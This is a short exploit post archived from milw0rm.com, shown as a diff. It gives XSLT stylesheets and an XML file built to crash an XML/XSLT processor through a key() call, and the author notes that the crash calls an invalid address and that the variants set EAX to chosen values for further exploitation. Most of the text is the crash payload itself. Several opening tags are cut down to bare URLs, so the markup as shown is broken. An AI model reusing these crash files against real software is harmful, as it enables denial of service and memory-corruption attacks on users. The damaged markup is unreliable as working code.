@@ -1,0 +1,43 @@
+-------------
+by DATA_SNIPER
+GREETZ TO THE FOUNDER ;)
+fore more information and bug analyses:
+http://www.at4re.com/f/showthread.php?p=47560
+i tray to manipulate the POC for new idea,you now that the call is calling invalid address [00000000]
+so i can change it to [00000031] ,i konw it's usless but it can make diffrent when some smart  can exploit it by changing some things in the exploit.
+and the second code  change the EAX to 017ED9A0.
+xslt.xsl code EAX=00000031:
+<?xml version="1.0" encoding="UTF-8"?>
+
+http://www.w3.org/1999/XSL/Transform">
+
+    <xsl:key name="label" match="item1" use=""/>
+
+    <xsl:template match="root">
+                   <xsl:for-each select="key('label', @item1)">
+                </xsl:for-each>
+    </xsl:template>
+
+</xsl:stylesheet>
+xslt.xsl code EAX=017ED9A0:
+<?xml version="1.0" encoding="UTF-8"?>
+
+http://www.w3.org/1999/XSL/Transform">
+
+    <xsl:key name="label" match="item1" use=""/>
+
+    <xsl:template match="root">
+                   <xsl:value-of select="key('label', @item1)">
+                </xsl:value-of>
+    </xsl:template>
+</xsl:stylesheet>
+
+xmlcrash.xml code:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" href="xslt.xsl"?>
+http://www.w3.org/2001/XMLSchema-instance">
+    <item1 id="datasniper" />
+</root>
+
+# milw0rm.com [2009-04-06]
